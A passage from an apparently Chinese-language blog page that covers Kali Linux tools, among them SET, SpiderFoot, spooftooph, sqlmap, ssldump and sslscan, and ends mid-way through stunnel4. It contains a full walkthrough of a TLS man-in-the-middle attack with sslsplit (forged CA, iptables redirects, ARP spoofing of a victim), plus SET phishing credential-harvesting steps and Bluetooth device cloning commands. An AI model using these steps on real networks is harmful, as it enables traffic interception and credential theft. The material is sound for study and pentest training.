src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151316837.png" alt="image-20220415131623701"></p><p>在接下来显示的选项里我们输入2并回车，表示网页攻击向量</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151316201.png" alt="image-20220415131636039"></p><p>然后输入3<br>凭证搜集攻击方法<br>（意思是我们使用这种方法可以通过钓鱼网站来获得受害人的用户名、密码等敏感信息）</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151319193.png" alt="image-20220415131935036"></p><p>选择想用的  然后输入ip即可</p><h2 id="sorter"><a href="#sorter" class="headerlink" title="sorter"></a>sorter</h2><h3 id="描述：-78"><a href="#描述：-78" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151325736.png" alt="image-20220415132533561"></p><h3 id="参数：-63"><a href="#参数：-63" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">必需的参数如下。 这将分析一个或多个图像，并将结果保存在“ -d”目录中或将结果列出到STDOUT（如果给出了“ -l”）。<br><br>-d <span class="hljs-built_in">dir</span><br>指定应写入所有文件的位置。 如果给出了“ -s”标志，则包括索引文件和子目录。 除非给出“ -l”列表标志，否则必须给出这个。<br><br>-l<br>将信息列出到STDOUT（永远不会写入文件）。 这对于使用“ netcat”的事件响应很有用。 如果使用“ -d”，则无法使用。<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则后续的图像段将自动包含在内。<br><br>选项如下：<br><br>-f fstype<br>指定图像的文件系统类型。 这与侦探工具包使用的类型相同。<br><br>-i imgtype<br>指定文件系统所在的图像类型。这与Sleuth Kit使用的图像类型相同。<br><br>-o imgoffset<br>指定从映像开头到文件系统开头的扇区偏移量。<br><br></code></pre></td></tr></table></figure><h2 id="spiderfoot"><a href="#spiderfoot" class="headerlink" title="spiderfoot"></a>spiderfoot</h2><h3 id="描述：-79"><a href="#描述：-79" class="headerlink" title="描述："></a>描述：</h3><p>SpiderFoot 是另一个免费的开源工具，可以自动化 OSINT 流程。它能够收集有关 IP、域、网络和人员的信息。SpiderFoot 是用 Python 编写的，具有简单易用的用户界面。它使用 100 多个公共信息资源并分析从 DNS 服务器、电子邮件、IP 等收集的数据。</p><h4 id="OSINT是什么"><a href="#OSINT是什么" class="headerlink" title="OSINT是什么?"></a>OSINT是什么?</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">OSINT(开源情报)是在公共领域可用的数据，它可能揭示关于目标的有趣信息。这包括DNS、Whois、网页、被动DNS、垃圾邮件黑名单、文件元数据、威胁情报列表以及SHODAN、HaveIBeenPwned?和更多。<br><br>作者：Threathunter<br>链接：https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">4</span>c61ecafe405<br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br></code></pre></td></tr></table></figure><h3 id="参数：-64"><a href="#参数：-64" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151333125.png" alt="image-20220415133315964"></p><p>命令行模式看不懂</p><p>直接docker装一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y  yum-utils   device-mapper-persistent-data   lvm2 <span class="hljs-comment">#安装docker依赖</span><br>yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo <span class="hljs-comment">#下载源</span><br>yum update <span class="hljs-comment">#更新源信息</span><br>yum install -y  docker-ce docker-ce-cli containerd.io <span class="hljs-comment"># 安装docker</span><br>systemctl start docker <span class="hljs-comment">#启动docker</span><br>systemctl <span class="hljs-built_in">enable</span> docker <span class="hljs-comment">#加入开机启动</span><br>git <span class="hljs-built_in">clone</span> https://github.com/smicallef/spiderfoot.git <span class="hljs-comment">#下载git包</span><br><span class="hljs-built_in">cd</span> spiderfoot <span class="hljs-comment">#进入目录</span><br>docker build -t spiderfoot . <span class="hljs-comment">#dockerfile构建镜像文件（注意后面有一点）</span><br>docker run -p 5009:5001 -d spiderfoot <span class="hljs-comment">#启动容器</span><br>docker ps <span class="hljs-comment">#查看容器</span><br>docker <span class="hljs-built_in">exec</span> -it [container_addr] /bin/sh <span class="hljs-comment">#进入容器</span><br>python ./sfcli.py -s http://localhost:5009 <span class="hljs-comment"># 执行脚本</span><br><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151353759.png" alt="image-20220415135322593"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>输入信息进行查找，可以是电话、姓名、域名、子网、ipv4、ipv6等。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151354168.png" alt="image-20220415135445995"></p><p>下面对扫描的信息进行细化，找到自己想要的信息。<br>这里可以看到与扫描内容相关联的其他信息。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151356003.png" alt="image-20220415135638806"></p><p>下面对扫描的信息进行细化，找到自己想要的信息。<br>这里可以看到与扫描内容相关联的其他信息。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151358742.png" alt="image-20220415135804580"></p><h2 id="spooftooph"><a href="#spooftooph" class="headerlink" title="spooftooph"></a>spooftooph</h2><h3 id="描述：-80"><a href="#描述：-80" class="headerlink" title="描述："></a>描述：</h3><p>Spooftooph是一个了不起的工具，旨在自动欺骗或克隆蓝牙信息(名称，类和地址)。欺骗蓝牙信息对于许多目的是有用的，例如将蓝牙设备隐藏在普通站点中，访问受保护的信息和观察。<br>这是它的特点：</p><ul><li>克隆并记录蓝牙设备信息</li><li>生成随机的新蓝牙配置文件</li><li>每隔X秒更改蓝牙配置文件</li><li>指定蓝牙接口的设备信息</li><li>从扫描日志中选择要克隆的设备</li></ul><h3 id="参数：-65"><a href="#参数：-65" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">用法：spooftooph -i dev [-mstu] [-nac] | [-R] | [-r file] [-w file] <br>-a<br><br>：指定新的BD_ADDR<br>-b ：每个要显示的蓝牙配置文件数页面<br>-B：对于较小的屏幕禁用横幅(如手机)<br>-c ：指定新类<br>-h：帮助<br>-i ：指定接口<br>-m：选择在指定多个接口<br>-n ：指定新名称<br>-r ：读入CSV日志文件<br>-R：分配随机名称，CLASS和ADDR<br>-s：扫描本地区域中的设备<br>-t ：克隆设备的时间间隔<br>-u：USB延迟。用于重新初始化接口<br>-w 的交互式延迟：写入CSV日志文件(在必须通过USB时在虚拟化环境中有用。)<br><br></code></pre></td></tr></table></figure><p>注意： 要修改蓝牙适配器，必须以root权限运行spooftooth。</p><p>Spooftooph提供五种使用模式：</p><p>指定NAME，CLASS和ADDR。</p><p>root @ test：spooftooph -i hci0 -n new_name -a 00：11：22：33：44：55 -c 0x1c010c</p><p>随机生成NAME，CLASS和ADDR。</p><p>root @ test：spooftooph -i hci0 -R</p><p>扫描范围内的设备并选择要克隆的设备。(可选)将设备信息转储到指定的日志文件中。</p><p>root @ test：spooftooph -i hci0 -s -w file.csv</p><p>从日志文件加载设备信息并指定要克隆的设备信息。</p><p>root @ test：spooftooph -i hci0 -r file.csv</p><p>每隔x秒在范围内克隆随机设备信息。</p><p>root @ test：spooftooph -i hci0 -t 10</p><p>hci0为蓝牙驱动名</p><h2 id="SQLite-database-browser"><a href="#SQLite-database-browser" class="headerlink" title="SQLite database browser"></a>SQLite database browser</h2><h3 id="描述：-81"><a href="#描述：-81" class="headerlink" title="描述："></a>描述：</h3><p>可视化的数据库浏览器</p><h3 id="参数：-66"><a href="#参数：-66" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151427669.png" alt="image-20220415142708482"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h3 id="描述：-82"><a href="#描述：-82" class="headerlink" title="描述："></a>描述：</h3><p>sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。</p><h3 id="参数：-67"><a href="#参数：-67" class="headerlink" title="参数："></a>参数：</h3><p><a href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p><h2 id="ssldump"><a href="#ssldump" class="headerlink" title="ssldump"></a>ssldump</h2><h3 id="描述：-83"><a href="#描述：-83" class="headerlink" title="描述："></a>描述：</h3><p>ssldump 是一个 <a href="https://so.csdn.net/so/search?q=SSL&spm=1001.2101.3001.7020">SSL</a>&#x2F;TLS 网络协议分析工具，弥补了tcpdump在分析SSL&#x2F;TLS上的不足。ssldump将解码后的内容输出到标准输出stdout。如果能够选择私钥文件，也能够解密出加密链接以及内容。</p><h3 id="参数：-68"><a href="#参数：-68" class="headerlink" title="参数："></a>参数：</h3><p><strong>使用格式</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssldump [ -vTshVq -aAdeHnNqTxXvy ] [ -i interface ]<br><br>[ -k keyfile ] [ -p password ] [ -r dumpfile ]<br>[ -S [crypto|d|ht|H|nroff] ] [ expression ]<br></code></pre></td></tr></table></figure><p><strong>参数选项：Options</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a<br>打印空的TCP ACK（用于观察Nagle行为）<br><br>-A<br>打印所有记录字段（默认情况下，ssldump选择最有趣的字段）<br></code></pre></td></tr></table></figure><h3 id="示例：Examples"><a href="#示例：Examples" class="headerlink" title="示例：Examples"></a>示例：Examples</h3><p>监听eth0、443端口上的网络流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssldump -i eth0 port 443<br></code></pre></td></tr></table></figure><p>监听eth0、443端口上的网络流量，指定网络主机<a href="http://www.abc.com/">www.abc.com</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssldump -i le0 port 443 and host www.abc.com<br></code></pre></td></tr></table></figure><p>使用私钥以及密码解密网络流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Tips: 使用 -k 参数解密需要同时满足以下条件：<br>1. 使用静态的RSA加密-(DH加密算法无法解密)<br>2. 有私钥<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssldump -Ad -k ~/server.pem -p foobar -i le0 host www.abc.com<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/makenothing/article/details/55803875">https://blog.csdn.net/makenothing/article/details/55803875</a></p><h2 id="sslscan"><a href="#sslscan" class="headerlink" title="sslscan"></a>sslscan</h2><h3 id="描述：-84"><a href="#描述：-84" class="headerlink" title="描述："></a>描述：</h3><p>SSLscan主要探测基于<a href="https://so.csdn.net/so/search?q=ssl&spm=1001.2101.3001.7020">ssl</a>的服务，如https。SSLscan是一款探测目标服务器所支持的SSL加密算法工具。</p><p>SSLScan queries SSL services, such as HTTPS, in order to determine the ciphers that are supported. SSLScan is designed to be easy, lean and fast. The output includes preferred ciphers of the SSL service, the certificate and is in Text and XML formats.</p><p>使用HTTPS可以防止中间人攻击，但是只有当配置正确并使用强加密才行。</p><p>关于SSL协议的漏洞也爆出了不少。</p><h3 id="参数：-69"><a href="#参数：-69" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151451545.png" alt="image-20220415145137610">Heartbleed是TLS实现上的一个漏洞，2014年4月爆出</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151452583.jpeg" alt="02e2410fd93fd83d181049d5f4a624a2.png">上图显示服务器支持的<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95&spm=1001.2101.3001.7020">加密算法</a>，红字认为是不那么安全的加密算法，黄字中等安全。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151452290.jpeg" alt="3b3d57d753519dc285ea23b887a312b0.png"></p><p>SSL证书信息，RSA key的长度建议是2048 bit。</p><p>Kali Linux中还有一个叫SSLyze的工具，配合sslscan获得更多信息：</p><p># sslyze –regular your_target</p><p>SSL&#x2F;TLS信息也可以用OpenSSL命令获得：</p><p># openssl s_client -connect your_target:443</p><p>基于sslscan的工具：TLSSLed</p><p>它是一个Linux shell脚本,它的功能是测试目标SSL&#x2F;TLS(HTTPS)WEB 服务器的安全性。</p><h2 id="sslsplit"><a href="#sslsplit" class="headerlink" title="sslsplit"></a>sslsplit</h2><h3 id="描述：-85"><a href="#描述：-85" class="headerlink" title="描述："></a>描述：</h3><p>SSLsplit 是一个针对SSL&#x2F;TLS加密的网络连接进行攻击，为网络取证和渗透测试的工具。它会终止SSL &#x2F; TLS和启动一个新的连接到原来的目的地，记录所有传输的数据。它支持普通的TCP和SSL，HTTP和HTTPS，和IPv4和IPv6。为SSL和HTTPS，它生成并签署伪造X509v3证书上飞使用的原始凭证的主题DN和subjectAltName扩展。它支持服务器名称显示，RSA，DSA和ECDSA密钥，DHE 和ECDHE密码套件。如果私钥是可用的，它也可以使用现有的证书。</p><h3 id="参数：-70"><a href="#参数：-70" class="headerlink" title="参数："></a>参数：</h3><h4 id="利用SSLsplit工具实现TLS-x2F-SSL中间人攻击-ARP欺骗"><a href="#利用SSLsplit工具实现TLS-x2F-SSL中间人攻击-ARP欺骗" class="headerlink" title="利用SSLsplit工具实现TLS&#x2F;SSL中间人攻击 ARP欺骗"></a>利用SSLsplit工具实现TLS&#x2F;SSL中间人攻击 ARP欺骗</h4><p>SSL、TLS中间人攻击<br>利用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ARP地址欺骗<br>修改DHCP服务器,存在就近原则<br>手动修改网关<br>修改DNS设置<br>修改HOSTS文件<br>ICMP、STP、OSPF<br></code></pre></td></tr></table></figure><h4 id="利用SSLsplit工具实现SSL中间人攻击"><a href="#利用SSLsplit工具实现SSL中间人攻击" class="headerlink" title="利用SSLsplit工具实现SSL中间人攻击"></a>利用SSLsplit工具实现SSL中间人攻击</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">透明SSL/TLS中间人攻击工具<br>对客户端伪装成服务器，对服务器伪装成普通客户端<br>伪装服务器需要伪造证书<br>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击<br></code></pre></td></tr></table></figure><p>伪造证书<br>1.利用openssl生成证书私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl genrsa -out ca.key 2048<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151457834.png" alt="image-20220415145736625"></p><h5 id="2-利用私钥签名生成证书"><a href="#2-利用私钥签名生成证书" class="headerlink" title="2.利用私钥签名生成证书"></a><strong>2.利用私钥签名生成证书</strong></h5><p><code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code> 【req:请求;-new:新的;-x509:格式;-days:有效期;-key指定私钥;-out:根证书】</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151459605.png" alt="image-20220415145946452"></p><h5 id="3-开启路由转发功能"><a href="#3-开启路由转发功能" class="headerlink" title="3.开启路由转发功能"></a>3.开启路由转发功能</h5><p><strong>启动路由</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w net.ipv4.ip_forward=1 <br></code></pre></td></tr></table></figure><p>另一种方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151501752.png" alt="image-20220415150113602"></p><h5 id="4-设置iptables端口转发规则"><a href="#4-设置iptables端口转发规则" class="headerlink" title="4.设置iptables端口转发规则"></a>4.设置iptables端口转发规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -F<br></code></pre></td></tr></table></figure><p>清空当前表规则<br>【-t:指定表;-A PERROUTING:路由前生效;-p:指定协议;–dport:接受流量的端口;-j:指定处理方法（REDIRECT重定向）;–to-ports:转发端口】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080　【<span class="hljs-comment">#HTTP】</span><br>iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443 【<span class="hljs-comment">#HTTPS】</span><br>iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 【<span class="hljs-comment">#MSA】</span><br>iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 【<span class="hljs-comment">#SMTPS】</span><br>iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 【<span class="hljs-comment">#IMAPS】</span><br>iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 【<span class="hljs-comment">#POP3S】</span><br></code></pre></td></tr></table></figure><p><strong>使用下面命令显示所有刚才配置的规则</strong><br><code>iptables -t nat -L</code> #显示所有规则<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151509478.png" alt="image-20220415150955265"></p><h4 id="5-Arp欺骗-，截获目标主机的网络流量"><a href="#5-Arp欺骗-，截获目标主机的网络流量" class="headerlink" title="5. Arp欺骗 ，截获目标主机的网络流量"></a>5. Arp欺骗 ，截获目标主机的网络流量</h4><p><code>arpspoof -i eth0 -t</code> 目标IP -r 目标主机网关【-i:指定网卡;-t:欺骗目标;-r:网关地址】</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151514878.png" alt="image-20220415151440684"></p><h4 id="启动SSLsplit进行攻击"><a href="#启动SSLsplit进行攻击" class="headerlink" title="启动SSLsplit进行攻击"></a>启动SSLsplit进行攻击</h4><p><strong>创建目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-built_in">test</span>/logdir<br></code></pre></td></tr></table></figure><p><strong>侦听设定的端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sslsplit -D -l connect.log -j /root/test -S /root/test/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151515709.png" alt="image-20220415151526497"></p><p>出来一大段就对了</p><h4 id="7-伪造成功"><a href="#7-伪造成功" class="headerlink" title="7.伪造成功"></a>7.伪造成功</h4><p>伪造成功<br>通过被害机Win7访问https的网站，会出现“安全证书有问题的错误”，若点击接受，则链路被成功劫持，攻击机可嗅探传输的信息，如下图</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151519330.png" alt="image-20220415151937155"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151519756.png" alt="image-20220415151954484"></p><p>【在客户端访问攻击机时，sslsplit一瞬间将真实访问站点证书的真实信息收集记录下来，进行伪造浏览器中可查看的证书，以供用户查看】<br>#在connect.log可查看连接信息</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151520917.png" alt="image-20220415152009401"></p><p>#在test&#x2F;logdir可查看传输数据　　【使用grep命令筛选数据】</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151529877.png" alt="image-20220415152902655"></p><p><strong>#sslsplit会自动进行一定程度的解密，一般可查看到其数据信息</strong></p><h5 id="7-安装证书"><a href="#7-安装证书" class="headerlink" title="7.安装证书"></a>7.安装证书</h5><p>#当安装过伪造的根证书之后，访问网站的适合，将无告警提示</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151529025.png" alt="image-20220415152938826"></p><h4 id="中间人攻击前提"><a href="#中间人攻击前提" class="headerlink" title="中间人攻击前提"></a>中间人攻击前提</h4><p>【以下某一条符合则可】</p><ol><li>客户端已经信任伪造证书颁发机构（安装其根证书）</li><li>攻击者控制了合法证书颁发机构（控制CA服务器，为自己颁发证书）</li><li>客户端程序禁止了显示证书错误告警信息 （程序员个人能力有限）</li><li>攻击者已经控制客户端，并强制其信任伪造证书 （强制安装中间人的根证书）</li></ol><h2 id="sslyze"><a href="#sslyze" class="headerlink" title="sslyze"></a>sslyze</h2><h3 id="描述：-86"><a href="#描述：-86" class="headerlink" title="描述："></a>描述：</h3><p>SSLyze是一款使用python实现的SSL扫描工具，它可以扫描出SSL中一些经典的配置错误。SSLyze还为高级用户提供了一个简单的插件接 口，使得用户可以自由定制SSLyze。 SSLyze开放源代码、跨平台、支持windows&#x2F;linux 32位和64位系统。</p><ul><li>完全<a href="https://nabla-c0d3.github.io/sslyze/documentation/">documented Python API</a>，以便运行扫描并直接从python处理结果。</li><li><strong>new：支持tls 1.3和早期数据（0-rtt）测试。</strong></li><li>扫描在多个进程之间自动调度，使它们非常快。</li><li>性能测试：会话恢复和TLS票证支持。</li><li>安全测试：弱密码套件，不安全的重新谈判，机器人，心血等。</li><li>通过ocsp装订进行服务器证书验证和吊销检查。</li><li>支持smtp、xmpp、ldap、pop、imap、rdp、postgres和ftp上的starttls握手。</li><li>扫描结果可以写入xml或json文件以供进一步处理。</li><li>还有更多！</li></ul><h3 id="参数：-71"><a href="#参数：-71" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">--version<br>显示程序的版本号并退出<br><br>-h, --<span class="hljs-built_in">help</span><br>显示此帮助信息并退出<br><br>--regular<br>定期HTTPS扫描； --sslv2--sslv3--tlsv1--tlsv1_1--tlsv1_2--tlsv1_3--reneg--resum--certinfo--hide_rejected_ciphers--compression--heartbleed--openssl_ccs--fallback--robot的快捷方式<br></code></pre></td></tr></table></figure><p>信任商店选项:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">--update_trust_stores<br>更新SSLyze使用的默认信任库。 最新的商店将从https://github.com/nabla-c0d3/trust_stores_observatory下载。 该选项应单独使用，并将使SSLyze提供的任何其他命令行选项静音。<br></code></pre></td></tr></table></figure><p>客户端证书选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">--cert=CERT<br>客户端证书链文件名。 证书必须为PEM格式，并且必须从主题的客户证书开始，如果适用，则由中间的CA证书排序。<br><br>--key=KEY<br>客户端私钥文件名。<br><br>--keyform=KEYFORM<br>客户端私钥格式。 DER或PEM（默认）。<br><br>--pass=KEYPASS<br>客户端私钥密码短语。<br></code></pre></td></tr></table></figure><p>在线验证ssl网站</p><p><a href="https://www.ssllabs.com/ssltest/">https://www.ssllabs.com/ssltest/</a></p><h2 id="stunnel4"><a href="#stunnel4" class="headerlink" title="stunnel4"></a>stunnel4</h2><h3 id="描述：-87"><a href="#描述：-87" class="headerlink" title="描述："></a>描述：</h3><ul><li>无需修改源代码的情况下将 TCP 流量封装于 SSL 通道内</li><li>适用于本身不支持加密传输的应用</li><li>支持 openssl 安全特性</li><li>跨平台</li><li>性能优</li><li><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161516747.png" alt="在这里插入图片描述"></li></ul><h3 id="示例：-3"><a href="#示例：-3" class="headerlink" title="示例："></a>示例：</h3><h4 id="1-安装内网-stunnel4-服务器"><a href="#1-安装内网-stunnel4-服务器" class="headerlink" title="1. 安装内网 stunnel4 服务器"></a>1. 安装<a href="https://so.csdn.net/so/search?q=%E5%86%85%E7%BD%91&spm=1001.2101.3001.7020">内网</a> stunnel4 服务器</h4><p>服务器配置</p><p>生成证书：openssl req -new –days 365 -nodes -x509 -out &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem -keyout &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</p><p>创建配置文件 &#x2F;etc&#x2F;stunnel&#x2F;stunnel.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">cert = /etc/stunnel/stunnel.pem<br>setuid = stunnel4<br>setgid = stunnel4<br>pid = /var/run/stunnel4/stunnel4.pid<br>[mysqls]<br>accept = 0.0.0.0:443<br>connect = 1.1.1.11:3306<br></code></pre></td></tr></table></figure><p>stunnel4 自动启动</p><ul><li><p>&#x2F;etc&#x2F;default&#x2F;stunnel4</p><ul><li>ENABLED&#x3D;1</li></ul></li><li><p>启动stunnel4 服务端</p><ul><li>service stunnel4 start</li></ul></li><li><p>防火墙规则</p><ul><li>端口设置 TCP&#x2F;443 端口到 stunnel4 服务端 TCP&#x2F;443</li><li>设置防火墙规则</li></ul><p>stunnel4 客户端、</p></li></ul><h4 id="2-安装-stunnel4-客户端4"><a href="#2-安装-stunnel4-客户端4" class="headerlink" title="2. 安装 stunnel4 客户端4"></a>2. 安装 stunnel4 客户端4</h4><ul><li><p>安装 stunnel4 客户端</p><ul><li>kali 自带</li></ul></li><li><p>客户端配置</p><ul><li>创建配置文件 &#x2F;etc&#x2F;stunnel&#x2F;stunnel.conf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">client = <span class="hljs-built_in">yes</span><br>[mysqls]<br>accept = 3306<br>connect = 192.168.1.11:443<br></code></pre></td></tr></table></figure><p>客户端自动启动</p><ul><li>&#x2F;etc&#x2F;default&#x2F;stunnel4<ul><li>ENABLED&#x3D;1</li></ul></li></ul><p>启动客户端服务</p><ul><li>service stunnel4 stop 